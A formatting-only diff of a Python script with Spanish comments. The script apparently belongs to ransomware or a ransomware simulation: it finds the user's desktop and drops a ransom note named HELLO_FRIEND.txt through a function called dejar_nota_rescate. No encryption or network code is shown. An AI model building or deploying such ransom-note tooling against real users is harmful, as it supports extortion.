@@ -48,10 +48,11 @@ def obtener_ruta_escritorio():
     if sistema == "Windows":
         try:
             import winreg
+
             # Clave de registro que contiene las rutas reales de las carpetas de usuario
             clave = winreg.OpenKey(
                 winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
+                r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders",
             )
             # 'Desktop' es el valor que buscamos. Puede contener variables como %USERPROFILE%
             ruta_reg, _ = winreg.QueryValueEx(clave, "Desktop")
@@ -64,13 +65,13 @@ def obtener_ruta_escritorio():
             for p in posibles:
                 if p.exists():
                     return p
-    
+
     # Linux y macOS
     posibles = [home / "Desktop", home / "Escritorio"]
     for p in posibles:
         if p.exists():
             return p
-            
+
     # Último recurso: el HOME del usuario
     return home
 
@@ -100,7 +101,9 @@ def dejar_nota_rescate(token):
         # Si falla el escritorio (permisos o ruta), intentar en el directorio actual
         try:
             Path("HELLO_FRIEND.txt").write_text(msj)
-            print(f"[!] No se pudo acceder al escritorio, nota dejada en directorio actual.")
+            print(
+                f"[!] No se pudo acceder al escritorio, nota dejada en directorio actual."
+            )
         except:
             pass
 
